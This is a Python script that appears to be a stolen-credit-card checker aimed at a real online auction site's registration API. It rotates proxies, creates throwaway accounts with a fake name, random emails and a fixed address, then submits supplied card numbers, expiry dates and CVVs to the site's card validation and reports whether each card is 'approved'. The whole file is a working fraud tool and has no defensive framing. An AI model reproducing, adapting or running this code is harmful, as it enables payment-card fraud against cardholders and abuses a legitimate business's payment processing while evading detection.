import requests,random,time,random,string
from proxy import proxies
import asyncio
def find_between(text, start, end):
    try:
        start_idx = text.index(start) + len(start)
        end_idx = text.index(end, start_idx)
        return text[start_idx:end_idx]
    except ValueError:
        return None
    
def generate_username():
    username = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return username
def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    longitud = random.randint(8, 12)
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo


async def Mona_Auth1(cc,mm,yy,cvv):
    proxy = proxies()
    r = requests.session()
    r.proxies = proxy
    username = generate_username()
    email = email_generator()

    headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            #'cookie': '__stripe_mid=a710d4ca-5f01-472b-aae7-5306fb62ddab9e129b',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    }

    response = r.get('https://jardine.auctioneersoftware.com/register', headers=headers)
    x_app_token = find_between(response.text, '__APP_TOKEN__ = "', '";')
    await asyncio.sleep(1)
    headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            # 'cookie': '__stripe_mid=a710d4ca-5f01-472b-aae7-5306fb62ddab9e129b; __stripe_sid=4e115f7f-2332-4453-9158-bd2afa9fa513ae6b50',
            'origin': 'https://jardine.auctioneersoftware.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://jardine.auctioneersoftware.com/register',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'x-app-token': x_app_token,
            'x-crunch': '1',
        }

    json_data = {
            'operationName': 'validate',
            'variables': {
                'input': {
                    'shipping_address': {
                        'state': {
                            'state_id': 59,
                            'state_name': 'New Brunswick',
                        },
                        'country_id': '40',
                    },
                    'main_address': {
                        'state': {
                            'state_id': 62,
                            'state_name': 'Ontario',
                        },
                        'country_id': '40',
                        'line_1': '3035 Dundas St W',
                        'zip_code': 'M6P 1Z5',
                        'city': 'Toronto',
                    },
                    'username': username,
                    'password': 'Ayanpro@087',
                    'first_name': 'Albedo',
                    'last_name': 'Jones',
                    'email': email,
                    'interested_in_list': 'AUTOMOTIVE',
                    'phone_1': {
                        'phone': '+18552614866',
                        'is_active': False,
                    },
                    'dynamic_values': {
                        '1036': {
                            'value': 'No',
                        },
                    },
                    'date_of_birth': '2000-02-22T18:30:00.000Z',
                    'heard_about_us_list': '',
                },
            },
            'query': 'mutation validate($input: UserCreateInput!) {\n  validateUser(input: $input)\n}',
        }

    response = r.post('https://jardine.auctioneersoftware.com/api', headers=headers, json=json_data)
    await asyncio.sleep(2)
    headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            # 'cookie': '__stripe_mid=a710d4ca-5f01-472b-aae7-5306fb62ddab9e129b; __stripe_sid=4e115f7f-2332-4453-9158-bd2afa9fa513ae6b50',
            'origin': 'https://jardine.auctioneersoftware.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://jardine.auctioneersoftware.com/register',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'x-app-token': x_app_token,
            'x-crunch': '1',
        }

    json_data = {
            'operationName': 'validate_card',
            'variables': {
                'input': {
                    'description': '',
                    'card_number': cc,
                    'expiration_month': int(mm),
                    'expiration_year': int(yy),
                    'cvv': cvv,
                    'location': {
                        'line_1': '3035 Dundas St W',
                        'city': 'Toronto',
                        'state': {
                            'state_id': 62,
                            'state_name': 'Ontario',
                        },
                        'zip_code': 'M6P 1Z5',
                        'country_id': 40,
                    },
                    'first_name': 'Albedo',
                    'last_name': 'Jones',
                },
            },
            'query': 'mutation validate_card($input: CreditCardCreateInput!) {\n  validateCreditCard(input: $input) {\n    additional_verification\n    errors\n    __typename\n  }\n}',
        }

    response = r.post('https://jardine.auctioneersoftware.com/api', headers=headers, json=json_data)
    headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': '',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            # 'cookie': '__stripe_mid=a710d4ca-5f01-472b-aae7-5306fb62ddab9e129b; __stripe_sid=4e115f7f-2332-4453-9158-bd2afa9fa513ae6b50',
            'origin': 'https://jardine.auctioneersoftware.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://jardine.auctioneersoftware.com/register',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'x-app-token': x_app_token,
            'x-crunch': '1',
        }

    json_data = {
            'operationName': 'registerUser',
            'variables': {
                'user': {
                    'shipping_address': {
                        'state': {
                            'state_id': 59,
                            'state_name': 'New Brunswick',
                        },
                        'country_id': '40',
                    },
                    'main_address': {
                        'state': {
                            'state_id': 62,
                            'state_name': 'Ontario',
                        },
                        'country_id': '40',
                        'line_1': '3035 Dundas St W',
                        'zip_code': 'M6P 1Z5',
                        'city': 'Toronto',
                    },
                    'username': username,
                    'password': 'Ayanpro@087',
                    'first_name': 'Albedo',
                    'last_name': 'Jones',
                    'email': email,
                    'interested_in_list': 'AUTOMOTIVE',
                    'phone_1': {
                        'phone': '+18552614866',
                        'is_active': False,
                    },
                    'dynamic_values': {
                        '1036': {
                            'value': 'No',
                        },
                    },
                    'date_of_birth': '2000-02-22T18:30:00.000Z',
                    'agreeToTerms': True,
                    'agreeToNewsletter': False,
                    'agreeToPrivacyPolicy': False,
                    'terms': '<p>JARDINE AUCTIONEERS INC is a wholly owned company operating under valid license in the province of New Brunswick and conducts regular auction sales throughout the year to both live buyers and online buyers. By completing this online registration form you acknowledge that you have read, understood and agree with the terms and conditions set out within and certify that the information provided is true and accurate.</p>\n<ol>\n<li>No bidder shall retract their bids. All sales are final.&nbsp;</li>\n<li>Bidders are responsible for all purchases made on their online bid number. Please do not share your username/password with anyone. Bidder must notify the auction immediately if they suspect their login credentials have been compromised.</li>\n<li>Unless otherwise identified, all items are sold AS-IS, WHERE-IS with no warranties expressed, written or implied.&nbsp;</li>\n<li>The winning bidder shall pay in addition to the purchase price all applicable buyers fees, admin fees, requested services and HST.</li>\n<li><span style="text-decoration: underline;">All bidders must validate a credit card in order to bid</span>. The auctioneer may at their discretion waive the credit card validation however this is subject to the bidder supplying specific financial information at least one (1) week in advance of an auction. This includes (but not limited to) financial stability letter from a bank, stand-by letter of credit, pre-approved loan, wire transfer of deposit, auction references.&nbsp;</li>\n<li>Credit card validation is outsourced through Moneris. No credit card information is stored by the auctioneer. Online bidders will have a hold placed on their card until the conclusion of the auction. Successful bidders will have the hold converted to a deposit with all unsuccessful bidders having their hold released within 24 hours.</li>\n<li>Full payment is due 48 hours following the conclusion of the auction by either credit card (up to $10,000), wire transfer or eTransfer. Buyers may also elect to pay (in person) at our office with either cash or debit. We do not accept paypal at this time.</li>\n<li>If full payment has not been made within 48 hours and with no arrangements having been made, the buyer hereby allows the auction to charge their credit card a 25% payment, plus the processing fee, to be applied against their amount owing.&nbsp;</li>\n<li>Failure to pay for any item in full will result in the asset being resold in the next available auction with all applicable storage, handling and commissions being deducted and the buyer losing their auction priviledges.</li>\n<li>The auctioneer will not release goods if the buyer has any outstanding charges due.&nbsp;</li>\n<li>A Buyers premium is applied to all items sold by the auctioneer. Each type of auction carries a different buyers premium. Please refer to each auctions terms and conditions as the buyers premium is clearly outlined.</li>\n<li>Successful buyers are encouraged to properly ensure (if applicable) their purchase(s) once full payment has been made.</li>\n<li>All registrations/titles/ownerships will be handled, processed and transferred by the auctioneer in a timely fashion once full payment has been made.&nbsp;</li>\n<li>Consignors are forbidden to bid on their own lots. Any consignor caught bidding on their own asset will immediately lose their auction privileges and the asset will be resold in a future auction. The consignor will be charged both commissions (buyer and seller) along with a $500.00 administration fee.</li>\n<li>Carfax vehicle history reports are provided to ensure buyers have all the information. The auctioneer is not responsible for any of the information that appears on this report and buyers cannot cancel any sale in the event of a discrepancy on a Carfax report.</li>\n<li>The auctioneer will report the odometer reading of every vehicle and supply a digital photograph. In the event a vehicle is stated to be in kilometers when it is actually measured in miles AND a clear photo of the odometer and cluster is provided, the sale will not be cancelled. It is the responsibility of the buyer to review each picture.</li>\n<li>The auctioneer will not cancel a sale if a provincial safety inspection sticker is suspected of being fraudulent or not valid.&nbsp;</li>\n<li>The online &amp; printed catalogue are prepared based on information provided to us by the consignor and may contain written inaccuracies, typo\'s, errors or ommissions. <span style="text-decoration: underline;">VIEWING IS HIGHLY RECOMMENDED</span>. Jardine Auctioneers staff policy is to not offer any opinions of fitness or value and will not be held liable in the event this occurs.&nbsp;</li>\n<li>Any clarifications regarding the above terms and conditions must be made prior to entering any auction (live or online).</li>\n</ol>\n<h3>BUYERS FEES</h3>\n<ul>\n<li>TIMED AUCTIONS - 12% of the hammer price</li>\n<li>AUTOMOTIVE AUCTIONS - 10% of the hammer price ($95 min charge, $950 max charge)</li>\n<li>EQUIPMENT AUCTIONS - 8% of the hammer price ($300 min charge, $2300 max charge)</li>\n</ul>\n<p><span style="text-decoration: underline;">Administration fee</span> - Applied to all purchases (Automotive or Equipment) that require a Provincial registration transfer.</p>\n<ul>\n<li>If hammer price is $975 or lower - $75</li>\n<li>If hammer price is $1000 or higher - $185</li>\n</ul>\n<p><strong><span style="color: rgb(0, 0, 0);">Internet fee</span></strong> - $55 applied to the purchase of any asset in our Heavy Equipment or Automotive Auctions when using our online bidding software.&nbsp;</p>\n<h3><strong>REMOVAL OF ASSETS</strong></h3>\n<p>Buyers must have their purchases picked up based on the following deadlines...</p>\n<ul>\n<li><strong>TIMED AUCTIONS (ONSITE)</strong> - Items must be removed no later than seven (7) days following the conclusion of the auction.</li>\n<li><strong>TIMED AUCTIONS (OFFSITE)</strong> - Items must be removed no later than five (5) days following the conclusion of the auction.&nbsp;</li>\n<li><strong>AUTOMOTIVE AUCTIONS</strong> - Items must be removed no later than ten (10) days following the conclusion of the auction.</li>\n<li><strong>EQUIPMENT AUCTIONS</strong> - Items must be removed no later than fourteen (14) days following the conclusion of the auction.</li>\n</ul>\n<ol>\n<li>All items that have not been picked up once the removal period has expired are subject to storage and handling fees being applied.</li>\n<li>Offsite timed auctions are strictly enforced. All items that have not been picked up after the removal period expires will be picked up by our transportation division and brought to our auction facility at the buyers expense.&nbsp;</li>\n<li>Any purchase that has not been picked up within thirty (30) days following the expiration of the removal period shall be deemed abandoned and subsequently resold in the next available auction. All commissions, storage and handling fees shall be deducted from the proceeds.</li>\n</ol>\n<p><strong>Handling Fees</strong></p>\n<ul>\n<li>Timed Industrial auctions - $5 on every item sold</li>\n<li>Automotive - $10 on every vehicle sold</li>\n<li>Recreational - $10 on every item sold</li>\n<li>Heavy Equipment - $50 on every item sold</li>\n<li>Sheet metal - $10 on every lot sold</li>\n</ul>\n<p><strong>Storage Fees</strong></p>\n<p><strong>Repo storage, auction storage</strong> (Operational condition)</p>\n<p><br>&ndash; Light duty vehicles (under 1 ton) &ndash; $25 per day (+ $95 handling fee if inoperable)<br>&ndash; Medium duty vehicles (1 ton to 3 ton) &ndash; $45 per day (+ $125 handling fee if inoperable)<br>&ndash; Heavy duty vehicles ( over 3 ton) &ndash; $60 per day (+ $200 handling fee if inoperable)<br>&ndash; Heavy Equipment, boats, Van trailers, etc &ndash; $75 per day (+ $300 handling fee if inoperable)</p>\n<p>Jardine Auctioneers will make every reasonable attempt to work with buyers that are experiencing difficulty making transportation arrangements so that unnecessary storage and handling fees are avoided.&nbsp;</p>\n<h3>LOADING ASSISTANCE (ONSITE)</h3>\n<p>It is the responsibility of the buyer to bring or arrange the appropriate vehicle or trailer to safely remove the assets from our compound. The auction reserves the right to refuse loading if the transportation equipment being used appears unsafe or undersized.&nbsp;</p>\n<p>The auction will provide loading assistance with either their forklift or Wheel Loader. Buyers that purchased multiple assets will be required to schedule an appointment for pick up so that it does not interfere with assisting other customers. Buyers that request loading outside of our normal business hours will be charged $150.00 per hour (min 2 hour charge).</p>\n<p><strong>LOADING ASSISTANCE (OFFSITE)</strong></p>\n<p>Please refer to the specific terms and conditions of each offsite timed auction to see if loading assistance is provided. This will be clearly indicated in the auction description.</p>\n<p><strong>ALL FEES AND CHARGES ARE SUBJECT TO PROVINCIAL TAX (WHERE APPLICABLE).</strong></p>\n<p>&nbsp;</p>',
                    'agreeToAuctionTerms': False,
                    'credit_card': {
                        'description': '',
                        'card_number': cc,
                        'expiration_month': int(mm),
                        'expiration_year': int(yy),
                        'cvv': cvv,
                        'location': {
                            'line_1': '3035 Dundas St W',
                            'city': 'Toronto',
                            'state': {
                                'state_id': 62,
                                'state_name': 'Ontario',
                            },
                            'zip_code': 'M6P 1Z5',
                            'country_id': 40,
                        },
                        'first_name': 'Albedo',
                        'last_name': 'Jones',
                    },
                    'heard_about_us_list': '',
                },
            },
            'query': 'mutation registerUser($user: UserCreateInput!) {\n  createUser(input: $user) {\n    user {\n      status\n      user_id\n      first_name\n      middle_name\n      last_name\n      username\n      bidder_number\n      email\n      main_address {\n        country_name\n        __typename\n      }\n      __typename\n    }\n    errors\n    __typename\n  }\n}',
        }
    await asyncio.sleep(2)
    response = r.post('https://jardine.auctioneersoftware.com/api',  headers=headers, json=json_data)
    if 'errors' in response.json():
            msg = response.json()['errors'][0]['message']
            msg = msg.replace('Credit Card error: ', '')
            return msg
    else:
        return 'Card approved (027)'